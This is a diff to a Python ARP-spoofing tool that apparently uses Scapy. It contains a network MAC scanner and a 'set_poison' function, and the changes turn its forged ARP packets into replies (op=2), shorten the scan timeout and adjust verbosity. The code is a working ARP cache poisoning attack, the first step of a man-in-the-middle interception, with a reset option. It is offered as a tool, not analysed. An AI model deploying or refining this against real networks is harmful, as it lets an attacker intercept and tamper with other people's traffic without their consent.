@@ -20,7 +20,7 @@ def get_scan_mac(ipornet, onlyone=False, shell=False, summary=False):
     arp = ARP(pdst=ipornet)
     ether = Ether(dst='ff:ff:ff:ff:ff:ff')
     packet = ether / arp
-    rcvList, plist = srp(packet, timeout=10, verbose=shell)
+    rcvList, plist = srp(packet, timeout=4, verbose=shell)
     if summary: rcvList.summary()
     if onlyone: return rcvList[0][1].src
     return None
@@ -38,8 +38,8 @@ def set_poison(targetip, poisonip, shell=False, reset=False):
     if not my_mac: my_mac = get_if_hwaddr(conf.iface)
     if not target_mac: target_mac = get_mac(targetip)
     if not poison_mac: poison_mac = get_mac(poisonip)
-    arp = ARP(hwsrc=target_mac if reset else my_mac, psrc=targetip, hwdst=poison_mac, pdst=poisonip)
-    plist = send(arp, verbose=shell,count=4)
+    arp = ARP(op=2, hwsrc=target_mac if reset else my_mac, psrc=targetip, hwdst=poison_mac, pdst=poisonip)
+    plist = send(arp, verbose=shell)
 
 
 args = get_user_params()
@@ -60,6 +60,6 @@ if args.targetip and args.poisonip:
         print('\nPoison Reset.')
         print("Programdan çıkılıyor.")
 elif args.ipaddress:
-    get_scan_mac(args.ipaddress, shell=True, summary=True)
+    get_scan_mac(args.ipaddress, summary=True)
 else:
     print("for help parameters : --help")
